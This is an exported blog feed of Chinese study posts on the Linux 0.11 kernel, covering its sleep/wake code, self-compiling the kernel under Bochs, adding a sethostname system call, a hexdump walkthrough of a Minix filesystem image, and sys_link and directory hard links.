<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 唤醒*p指向的让任务。*p是任务等待队列头指针。由于新等待任务是插入在等待队列头指针处的，</span></span><br><span class="line"><span class="comment">// 因此唤醒的是最后进入等待队列的任务。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">		(**p).state=<span class="number">0</span>;          <span class="comment">// 置为就绪(可运行)状态TASK_RUNNING.</span></span><br><span class="line">		*p=<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>同样的源代码于interruptible_sleep_on函数。大体思路差不多，只不过此状态可被某些信号唤醒，不必要一定调用wake_up函数来置位。如注释所说，因此必须判断是否当前任务是否为等待头指针才能对头指针进行唤醒而自身又置为TASK_INTERRUPTIBLE状态并重新调度。(由于信号对其会产生影响而并不唯一是其他进程唤醒的)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 将当前任务置为可中断的等待状态，并放入*p指定的等待队列中。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若指针无效，则退出。(指针所指向的对象可以是NULL，但指针本身不会为0).如果当前任务是</span></span><br><span class="line">    <span class="comment">// 任务0，则死机。</span></span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">		panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">    <span class="comment">// 让tmp指向已经在等待队列上的任务(如果有的话)，例如inode-&gt;i_wait。并且将睡眠队列头的</span></span><br><span class="line">    <span class="comment">// 等待指针指向当前任务。这样就把当前任务插入到了*p的等待队列中。然后将当前任务置为可</span></span><br><span class="line">    <span class="comment">// 中断的等待状态，并执行重新调度。</span></span><br><span class="line">	tmp=*p;</span><br><span class="line">	*p=current;</span><br><span class="line">repeat:	current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">	schedule();</span><br><span class="line">    <span class="comment">// 只有当这个等待任务被唤醒时，程序才又会回到这里，标志进程已被明确的唤醒执行。如果等待</span></span><br><span class="line">    <span class="comment">// 队列中还有等待任务，并且队列头指针所指向的任务不是当前任务时，则将该等待任务置为可运行</span></span><br><span class="line">    <span class="comment">// 的就绪状态，并重新执行调度程序。当指针*p所指向的不是当前任务时，表示在当前任务被被放入</span></span><br><span class="line">    <span class="comment">// 队列后，又有新的任务被插入等待队列前部。因此我们先唤醒他们，而让自己仍然等等。等待这些</span></span><br><span class="line">    <span class="comment">// 后续进入队列的任务被唤醒执行时来唤醒本任务。于是去执行重新调度。</span></span><br><span class="line">	<span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">		(**p).state=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> repeat;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 下一句代码有误：应该是 *p = tmp, 让队列头指针指向其余等待任务，否则在当前任务之前插入</span></span><br><span class="line">    <span class="comment">// 等待队列的任务均被抹掉了。当然同时也需要删除下面行数中同样的语句</span></span><br><span class="line">	*p=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (tmp)</span><br><span class="line">		tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CS中学会抽象还是非常重要的，无处不在的数据结构:)</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 在Linix 0.11操作系统里面编译Linux 0.11内核源码</title>
    <url>/embpgp.github.io/2016/12/21/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E5%9C%A8Linix-0-11%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%87%8C%E9%9D%A2%E7%BC%96%E8%AF%91Linux-0-11%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<blockquote>
<p>来回折腾，终得其法,之后的系列不会照着章节铺叙了~</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="Get开发版本"><a href="#Get开发版本" class="headerlink" title="Get开发版本"></a>Get开发版本</h1><p>参照书籍第836页17.8的教程，可以wget<a href="http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-040923.zip">此处</a>的压缩包到本地，解压之后修改掉相应的配置文件即可启动。</p>
<h1 id="修改源代码增加系统调用"><a href="#修改源代码增加系统调用" class="headerlink" title="修改源代码增加系统调用"></a>修改源代码增加系统调用</h1><p>我在tinylab上按照书上的教程增加了<code>sethostname</code>系统调用的相关代码和配置。发现用汇编直接编写或者嵌入汇编都是可以达到目的的，但是用C库调用硬是出问题，而后去gcc1.4版本的库文件查看发现并没有相关的信息，但是居然能够编译通过仅仅是执行出问题，相必是内核库文件里面有，但是gcc没有把代码实现链接过来，便想着手动强制gcc链接lib.a，但是报错，应该版本不一样导致的，因为编译Linux 0.11内核源码gcc版本是高版本的。又想着能否自己手动制作一个库文件到gcc1.4里面去呢?结果肯定是太麻烦了，从网上随意搜搜便发现<a href="http://deathking.github.io/hit-oslab/chap1.html">别人家的操作系统课程才是真正的操作系统</a>。然后才意识到Linux 0.11里面有前辈已经做好了自身源代码编译的条件，便尝试编译。然后又爆出<code>Not Owner</code>错误，<a href="https://cms.hit.edu.cn/mod/forum/discuss.php?d=5781">此处有讨论</a>。<del>个人认为还是hdc-0.11.img文件的制作者可能出了点小差错,文件系统命令没有正确调用系统调用。</del>因此暂时放弃tinylab的测试，转到前者去。(<em>刚刚想make start-hd进入继续编译发现又是Not Owner的问题，直接dd重载内核发现可以解决，说明不仅仅是hdc的问题或者说都有些问题的，猜测两者没兼容好,然后我直接把tinylab的hdc放到dev版本下硬盘启动后进入src/linux目录下便正常地直接编译了，此时已经不知道怎么解释了…猜测两者之间没兼容好吧</em>)</p>
<h1 id="0-11干上0-11"><a href="#0-11干上0-11" class="headerlink" title="0.11干上0.11"></a>0.11干上0.11</h1><p>启动赵博士的硬盘dev版本内核后直接进入到/usr/src/linux目录后,ls -la发现有uid问题.但是不碍事，直接make clean;make后开始编译了。而我在tinylab的源码里面编译出现问题，后面尝试修复。编译完毕之后按照教程先备份原来的引导内核，然后重新启动后在/usr/src/linux目录下键入<code>dd bs=8192 if=Image of=/dev/fd0</code>。为了看到新的内核引导我特意在main函数里面加入了一行代码，打印<code>New kernel Starting</code>。</p>
<ul>
<li>UID乱数字<br><img src="/images/Linux_0.11_compile_0.11_uid.png" alt="Linux_0.11_compile_0.11_uid.png"></li>
<li>make clean<br><img src="/images/Linux_0.11_compile_0.11_make_clean.png" alt="Linux_0.11_compile_0.11_make_clean.png"></li>
<li>make<br><img src="/images/Linux_0.11_compile_0.11_make.png" alt="Linux_0.11_compile_0.11_make.png"></li>
<li>restart<br><img src="/images/Linux_0.11_compile_0.11_new_kernel_start.png" alt="Linux_0.11_compile_0.11_new_kernel_start.png"></li>
</ul>
<h1 id="继续尝试调用sethostname"><a href="#继续尝试调用sethostname" class="headerlink" title="继续尝试调用sethostname"></a>继续尝试调用sethostname</h1><p>为了保险期间我先用嵌入汇编来写(系统调用号也被改到74去了)，但是居然给我报出了-38的错误号(我用printf看的)，果然查看内核错误号发现居然没有实现的意思，看源码发现真的是没有实现…dev版本的sys_sethostname系统调用直接<code>return -ENOSYS;</code>然后果断照着教程修改源码实现一遍，写出如下C函数，发现终于可以用了。</p>
<ul>
<li><img src="/images/Linux_0.11_compile_0.11_sethostname_syscall_num.png" alt="Linux_0.11_compile_0.11_sethostname_syscall_num.png"></li>
<li><img src="/images/Linux_0.11_compile_0.11_sethostname_call_C.png" alt="Linux_0.11_compile_0.11_sethostname_call_C.png"></li>
<li><img src="/images/Linux_0.11_compile_0.11_sethostname_test.png" alt="Linux_0.11_compile_0.11_sethostname_test.png"></li>
</ul>
<h1 id="转到tinylab工程上去"><a href="#转到tinylab工程上去" class="headerlink" title="转到tinylab工程上去"></a>转到tinylab工程上去</h1><p>本以为是tinylab的Linux 0.11操作系统里面的Linux 0.11内核源代码出了问题，<del>后来还是认为是hdc-0.11.img的缘故</del>。果断修改tools下的bochs的硬盘配置文化，将ata0改为<code>ata0-master: type=disk, path=&quot;rootfs/hdc-0.11-new.img&quot;, mode=flat, cylinders=410, heads=16, spt=38</code>，其中的hdc-0.11-new.img文件从赵博士的dev版本拷贝过来的，而后make start-hd后继续make clean发现仍然出现<code>Not Owner</code>问题，直接一波刚<code>chown -R root.root ./*</code>。之后就OK了。顺利编译链接写入引导重启没问题。(如果有问题则先dd重载内核后再编译)</p>
<ul>
<li><img src="/images/Linux_0.11_compile_0.11_chown.png" alt="Linux_0.11_compile_0.11_chown.png"></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然用C语言搭载成功嵌入hdc-0.11.img的gcc1.4能够继续开发Linux 0.11内核功能，但是能否学习bash来更好地契合Linux呢?我想我应该首先学一遍文件系统相关理论知识自己能够鼓捣hdc文件吧。发现hexdump居然可以用了~~~<br><img src="/images/Linux_0.11_compile_0.11_hexdump_root.png" alt="Linux_0.11_compile_0.11_hexdump_root.png"></p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 来吧,Minix!</title>
    <url>/embpgp.github.io/2016/12/22/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E6%9D%A5%E5%90%A7-Minix/</url>
    <content><![CDATA[<blockquote>
<p>认真学习Minix文件系统!通过一个实例手动分析Minix。具体源码实现由于考虑其他情况将很复杂。</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="mkfs-a-minix"><a href="#mkfs-a-minix" class="headerlink" title="mkfs a minix"></a>mkfs a minix</h1><p>如下图所示,先不考虑什么是i节点等等，我们只需要知道目前手动创建了一个文件系统，大小为360KB,并且拷贝了一个hello.c文件到其根目录下。<br><img src="/images/Linux_0.11_Minix_mkfs_dev_fd1_360.png" alt="Linux_0.11_Minix_mkfs_dev_fd1_360.png"><br><img src="/images/Linux_0.11_Minix_mkfs_dev_fd1_360_do.png" alt="Linux_0.11_Minix_mkfs_dev_fd1_360_do.png"></p>
<h1 id="再来简介Minix文件系统格式"><a href="#再来简介Minix文件系统格式" class="headerlink" title="再来简介Minix文件系统格式"></a>再来简介Minix文件系统格式</h1><h2 id="引导块"><a href="#引导块" class="headerlink" title="引导块"></a>引导块</h2><p>根据Minix文件系统的设计，我们上面创建的360KB的软盘总共分为6个部分，图中的块是以1KB为单位的，这是设计需求，注意区别于硬盘中的扇区。其中约定第一个块为引导块，虽然引导区约定为512字节但是在这里最小单位为1K,浪费也就不在乎了。即使不引导也得有引导标志以符合标准。<br><img src="/images/Linux_0.11_Minix_360K_fd_layout.png" alt="Linux_0.11_Minix_360K_fd_layout.png"></p>
<ul>
<li>注意0x200偏移前面的0xaa55。<br><img src="/images/Linux_0.11_Minix_360K_Boot.png" alt="Linux_0.11_Minix_360K_Boot.png"><h2 id="超级块"><a href="#超级块" class="headerlink" title="超级块"></a>超级块</h2>仅仅知道这是一块可用的软盘还是不够的，必须还得知道到底我们需要的数据存在什么地方。因此Minix文件系统在设计的时候用一个数据结构来描述整个可用设备的具体情况。<br><img src="/images/Linux_0.11_Minix_360K_super_block.png" alt="Linux_0.11_Minix_360K_super_block.png"><br>为什么要分内存中字段和磁盘中字段呢?本应该磁盘中存储这些数据结构是够了，但是操作系统为了更快更好地管理文件系统便用”以空间来换时间”的思想来操作数据。下面继续分析我们自己创建的360KB的软盘。在bochs终端键入<code>hexdump /dev/fd1 | more</code>。加more是由于终端不支持拉屏只能一帧帧看了。我们按空格键快速定位到偏移0x400。刚好是1KB后的块，即第1个块(引导区约定为0块)。对照着上面的数据结构照葫芦画瓢来解析各个字段(注意intel小端格式的显示)。</li>
<li>0x0078 short 16位 对应文件系统中i节点总数目 十进制为120 刚好对应创建文件系统的时候显示的结果。</li>
<li>0x0168 short 16位 逻辑块的数目　十进制为360 实质上在Minix 1.0设计的时候逻辑块大小等于磁盘块大小</li>
<li>0x0001 short 16位 i节点位图占块数目　1表示仅仅用一个块就可以描述所有i就节点映射情况</li>
<li>0x0001 short 16位 逻辑块位图占块数目 同上</li>
<li>0x0008　short 16位 表示数据区第一个块号 真正保存文件内容的块区</li>
<li>0x0000 short 16位 在Minix 1.0中恒等于0，为后期改版做准备。</li>
<li>0x10081c00 long 32位 最大文件长度，书中注释到”显然有误”,此字段应该是mkfs程序填充的，但是后面学习了i节点后进过计算个人认为没有那么”显然”,mkfs程序仅仅是用双重间接块号来计算的，即512*512*1KB = 256MB=268966912=0x10081c00字节。但是实际情况是可以再存多一点的。加上前面的直接块号和一次间接块号。但是从内存字段的定义来看答案又不一样…(不触碰原则就没事儿,灵活点儿)</li>
<li>0x137f short 16位 Magic Number　约定值，类似于本版本文件系统的标志。<br><img src="/images/Linux_0.11_Minix_360K_super_block_data.png" alt="Linux_0.11_Minix_360K_super_block_data.png"></li>
<li>关于内存中的字段含义参见原书或者Minix文件系统原理，对照着功能实现源码分析更好。</li>
<li>超级块在内核初始化的时候会被加载并分析，主要是为了加载根文件系统，或者mount其他文件系统和设备。</li>
</ul>
<h2 id="i节点位图和逻辑块位图"><a href="#i节点位图和逻辑块位图" class="headerlink" title="i节点位图和逻辑块位图"></a>i节点位图和逻辑块位图</h2><p>图中偏移量0x800和0xc00分别表示，均为0x0007,表示有三个块被占用，当然约定第0比特不能用，直接被设置为1。所以文件系统中有两个块被使用。</p>
<h2 id="i节点"><a href="#i节点" class="headerlink" title="i节点"></a>i节点</h2><p>文件系统中最重要的数据结构!!!和超级块类似，磁盘中仅仅保存最精简的字段，内存中其他字段将经常被使用。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct.png" alt="Linux_0.11_Minix_1.0_inode_struct.png"><br>看下图我们开始时候创建的360KB的软盘。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct_do.png" alt="Linux_0.11_Minix_1.0_inode_struct_do.png"><br>继续照葫芦画瓢~由上述定义可以知道,inode在磁盘空间大小为32字节，所以一个块(1024字节)能够存1024/32=32个数据结构，因此4个块就刚好是128个i节点。其中的4是块4、5、6、7。块0引导,块1为super_block。块2、3分别是位图。块8就是真正的数据部分了。找到偏移为0x1000(第4块)。</p>
<ul>
<li>0x41ed 表示目录文件权限为755。</li>
<li>0x0000 表示uid为0，即root用户</li>
<li>0x00000030 表示文件长度为0x30</li>
<li>0x585d223b 时间戳</li>
<li>0x00 gid为0,表示root用户组</li>
<li>0x02 链接数</li>
<li>0x08　数据区域的第一个块位置，后续均为0表示没有更多数据块了。<br><img src="/images/Linux_0.11_Minix_1.0_inode_struct_imode.png" alt="Linux_0.11_Minix_1.0_inode_struct_imode.png"><br>我们根据目录项的数据结构定义跳到第8块逻辑块继续追踪。即偏移量为0x2000处。</li>
<li>第一项</li>
<li>0x0001 为i节点号(刚刚才跳过来的地方)</li>
<li>0x2e 即为’.’，表示当前目录</li>
<li>第二项</li>
<li>0x0001 为i节点号</li>
<li>0x2e2e 即为”..”，表示上层目录，因为这是根目录，因此”..”=”.”</li>
<li>第三项</li>
<li>0x0002 为i节点号(待会儿分析）</li>
<li>一波ascii码，表示”hello.c”</li>
</ul>
<p>关于如何根据文件名称定位一个具体文件算法可以参见源码，原理参见书。<br><img src="/images/Linux_0.11_Minix_1.0_dir_entry_struct.png" alt="Linux_0.11_Minix_1.0_dir_entry_struct.png"></p>
<p>然后接着上面把hello.c文件也分析一下,如果已经定位了到刚刚的第三项，根据inode为2定位到其inode数据结构。</p>
<ul>
<li>0x8180 表示普通文件权限为600,注意文件类型定义为8进制数</li>
<li>0x0000 root</li>
<li>0x0000004a 表示文件大小为74字节</li>
<li>0x585d223b 时间戳</li>
<li>0x01 链接数</li>
<li>0x00 root</li>
<li>0x09 数据部分第一个块区，内容不多因此一个块足够。</li>
</ul>
<p>定位到偏移量为0x2400处，将这一大串ascii码翻译过来就是hello.c文件的具体内容。</p>
<h1 id="定位文件基本原理"><a href="#定位文件基本原理" class="headerlink" title="定位文件基本原理"></a>定位文件基本原理</h1><p><img src="/images/Linux_0.11_Minix_1.0_find_file_by_name.png" alt="Linux_0.11_Minix_1.0_find_file_by_name.png"><br><img src="/images/Linux_0.11_Minix_1.0_find_file_by_name_words.png" alt="Linux_0.11_Minix_1.0_find_file_by_name_words.png"></p>
<blockquote>
<p>现在来分析为什么说硬链接不能是目录以及不能跨文件系统而软链接就可以呢…</p>
</blockquote>
<h1 id="sys-link系统调用"><a href="#sys-link系统调用" class="headerlink" title="sys_link系统调用"></a>sys_link系统调用</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//// 为文件建立一个文件名目录项</span></span><br><span class="line"><span class="comment">// 为一个已存在的文件创建一个新链接(也称为硬链接 - hard link)</span></span><br><span class="line"><span class="comment">// 参数：oldname - 原路径名；newname - 新的路径名</span></span><br><span class="line"><span class="comment">// 返回：若成功则返回0，否则返回出错号。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_link</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * oldname, <span class="keyword">const</span> <span class="keyword">char</span> * newname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">oldinode</span>, * <span class="title">dir</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line">	<span class="keyword">int</span> namelen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先对原文件名进行有效性验证，它应该存在并且不是一个目录名。所以我们先取得原文件</span></span><br><span class="line">    <span class="comment">// 路径名对应的i节点oldnode.若果为0，则表示出错，返回出错号。若果原路径名对应的是</span></span><br><span class="line">    <span class="comment">// 一个目录名，则放回该i节点，也返回出错号。</span></span><br><span class="line">	oldinode=namei(oldname);</span><br><span class="line">	<span class="keyword">if</span> (!oldinode)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (S_ISDIR(oldinode-&gt;i_mode)) &#123;</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 然后查找新路径名的最顶层目录的i节点dir，并返回最后的文件名及其长度。如果目录的</span></span><br><span class="line">    <span class="comment">// i节点没有找到，则放回原路径名的i节点，返回出错号。如果新路径名中不包括文件名，</span></span><br><span class="line">    <span class="comment">// 则放回原路径名i节点和新路径名目录的i节点，返回出错号。</span></span><br><span class="line">	dir = dir_namei(newname,&amp;namelen,&amp;basename);</span><br><span class="line">	<span class="keyword">if</span> (!dir) &#123;</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!namelen) &#123;</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		iput(dir);</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 我们不能跨设备建立硬链接。因此如果新路径名顶层目录的设备号与原路径名的设备号不</span></span><br><span class="line">    <span class="comment">// 一样，则放回新路径名目录的i节点和原路径名的i节点，返回出错号。另外，如果用户没</span></span><br><span class="line">    <span class="comment">// 有在新目录中写的权限，则也不能建立连接，于是放回新路径名目录的i节点和原路径名</span></span><br><span class="line">    <span class="comment">// 的i节点，返回出错号。</span></span><br><span class="line">	<span class="keyword">if</span> (dir-&gt;i_dev != oldinode-&gt;i_dev) &#123;</span><br><span class="line">		iput(dir);</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -EXDEV;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!permission(dir,MAY_WRITE)) &#123;</span><br><span class="line">		iput(dir);</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 现在查询该新路径名是否已经存在，如果存在则也不能建立链接。于是释放包含该已存在</span></span><br><span class="line">    <span class="comment">// 目录项的高速缓冲块，放回新路径名目录的i节点和原路径名的i节点，返回出错号。</span></span><br><span class="line">	bh = find_entry(&amp;dir,basename,namelen,&amp;de);</span><br><span class="line">	<span class="keyword">if</span> (bh) &#123;</span><br><span class="line">		brelse(bh);</span><br><span class="line">		iput(dir);</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -EEXIST;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 现在所有条件都满足了，于是我们在新目录中添加一个目录项。若失败则放回该目录的</span></span><br><span class="line">    <span class="comment">// i节点和原路径名的i节点，返回出错号。否则初始设置该目录项的i节点号等于原路径名的</span></span><br><span class="line">    <span class="comment">// i节点号，并置包含该新添加目录项的缓冲块已修改标志，释放该缓冲块，放回目录的i节点。</span></span><br><span class="line">	bh = add_entry(dir,basename,namelen,&amp;de);</span><br><span class="line">	<span class="keyword">if</span> (!bh) &#123;</span><br><span class="line">		iput(dir);</span><br><span class="line">		iput(oldinode);</span><br><span class="line">		<span class="keyword">return</span> -ENOSPC;</span><br><span class="line">	&#125;</span><br><span class="line">	de-&gt;inode = oldinode-&gt;i_num;</span><br><span class="line">	bh-&gt;b_dirt = <span class="number">1</span>;</span><br><span class="line">	brelse(bh);</span><br><span class="line">	iput(dir);</span><br><span class="line">    <span class="comment">// 再将原节点的链接计数加1，修改其改变时间为当前时间，并设置i节点已修改标志。最后</span></span><br><span class="line">    <span class="comment">// 放回原路径名的i节点，并返回0（成功）。</span></span><br><span class="line">	oldinode-&gt;i_nlinks++;</span><br><span class="line">	oldinode-&gt;i_ctime = CURRENT_TIME;</span><br><span class="line">	oldinode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">	iput(oldinode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>根据源代码分析程序首先获取源(old)文件inode，如果不存在就直接返回了，如果存在则继续判断是否为目录，如果是则放回inode并返回。那么到这里几乎就可以回答为什么不能为目录了(因为源码实现不允许呀),但是仍然要刨根问底，假定有”开发者”绕过了这么策略操作系统将如何处理呢?先继续看。</li>
<li>之后就是检查目的(new)文件的顶层目录权限了，如果没问题将继续往下走</li>
<li>再后就是说的不能进行跨文件系统的硬链接…</li>
<li>如果没问题的话就在目的文件的目录下建立一个链接文件–&gt;本质上仅仅在其目录下新增了一个dir_entry结构体并使得其inode字段指向源文件m_inode的i_num字段,将inode的i_nlinkds字段++。</li>
<li>现在我们假设某”开发者”先绕过这个检查策略(自己修改这段源码然后创建目录硬链接或者二进制大牛自己手动输入都可)，看程序会发生什么…</li>
</ul>
<ul>
<li><p>可以看到至少shell是不允许我们创建的<br><img src="/images/Linux_0.11_fs_hard_links_not_allow.png" alt="Linux_0.11_fs_hard_links_not_allow.png"></p>
</li>
<li><p>开始建立一些测试文件,由于忘了linux 0.11版本仅仅允许最多14个字符的文件名字，导致有些名字不全。删除也出类似前面的问题，说不是owner。在写下这段文字之前我做的测试成功了但我自己建立的是根目录的硬链接，导致切换新的内核rm的时候把根文件系统删掉了。。。又重新复制了一个hdc文件过来。<br>图中的<code>dir_for_hard_l</code>(其实是dir_for_hard_link)是我们想要链接的目录(为了保险起见了，怕忘了又把根目录删了…)。<code>hard_link_not_</code>是C语言源程序，但是gcc编译的时候报错，因此我重定向了一个短的.c文件。<br><img src="/images/linux_0.11_fs_usr_root_dir.png" alt="linux_0.11_fs_usr_root_dir.png"></p>
</li>
<li><p>用来测试没有修改内核代码的时候能否创建目录硬链接。为了简单我也没有检测main函数的具体参数合法性了。看结果没有创建成功，而返回值-1恰恰是宏定义EPERM的负数，说明内核检测到了目录问题。<br><img src="/images/linux_0.11_fs_hard_link_not_allow.png" alt="linux_0.11_fs_hard_link_not_allow.png"></p>
</li>
<li><p>我修改了这段代码，然后重新编译内核代码看看吧。<br><img src="/images/linux_0.11_fs_hard_link_allow_codes.png" alt="linux_0.11_fs_hard_link_allow_codes.png"></p>
</li>
<li><p>用bash修改失败了，猜测在bash的实现中提前加入了检测，我们用C语言来就成功了。可以看到确实可以创建硬链接的，在这种情况下也没有出问题。<br><img src="/images/linux_0.11_fs_hard_link_allow_test.png" alt="linux_0.11_fs_hard_link_allow_test.png"><br><img src="/images/linux_0.11_fs_hard_link_allow_new_file.png" alt="linux_0.11_fs_hard_link_allow_new_file.png"></p>
</li>
</ul>
<ul>
<li><p>为了建立”有向循环图”测试之后删除的时候又把文件系统给删了…</p>
</li>
<li><p>以下为bash自带bc计算器快速进制转换命令，可以结合hexdump用于自己计算inode偏移自己解析数据结构啥的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;obase=10;ibase=16;50BA&quot;</span> | bc -l</span><br><span class="line">20666</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>下面为硬链接为目录出现的问题，我建立了一个指向自己父目录的目录,仅仅cd命令就”吃不消”了，若其他遍历目录树的工具的算法逃不出这个坑的话就死机了估计。因此文件系统的设计要求不能建立目录的硬链接，否则<strong>有可能</strong>导致循环图。<br><img src="/images/Linux_0.11_fs_hard_link_error.png" alt="Linux_0.11_fs_hard_link_error.png"></p>
</li>
</ul>
<ul>
<li>至于为什么不能跨文件系统，由于link的本质是在建立一个inode指针计数增加的目录项，而inode是各个文件系统分布不一致的，因此不能进行跨文件系统寻址，超级块都不一定一致。</li>
<li>而软链接在本版本的内核貌似没有实现，其具体实现是在软链接文件的数据块放置真正链接文件的路径字符串，因此系统拿到一个软链接的时候再用文件内容的路径去寻址，因此可以跨文件系统以及目录。<br><img src="/images/Linux_0.11_fs_no_symbolic_link.png" alt="Linux_0.11_fs_no_symbolic_link.png"></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然不可能每次都需要人来手动计算，计算机内部实现了更多算法来存取数据，大概的基本原理就这些，当然内存里面关于缓存和文件表等后期会稍微提一下。刨根问底还是很重要的。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第一章</title>
    <url>/embpgp.github.io/2016/11/07/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>一直想学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="Linux诞生和发展"><a href="#Linux诞生和发展" class="headerlink" title="Linux诞生和发展"></a>Linux诞生和发展</h1><p>Linux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:<br>UNIX操作系统:鼻祖<br>MINIX操作系统:DEMO版本供学习<br>GNU计划:GNU’s not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等<br>POSIX标准:Linux的未来<br>Internet网络:传播的媒介</p>
<h1 id="主要版本号"><a href="#主要版本号" class="headerlink" title="主要版本号"></a>主要版本号</h1><p><img src="/images/kernel_release_1.png" alt="kernel_release_1"><br><img src="/images/kernel_release_2.png" alt="kernel_release_2"></p>
<h1 id="内核目录树"><a href="#内核目录树" class="headerlink" title="内核目录树"></a>内核目录树</h1><p><img src="/images/Linux_kernel_0.11.png" alt="Linux_kernel_0.11"></p>
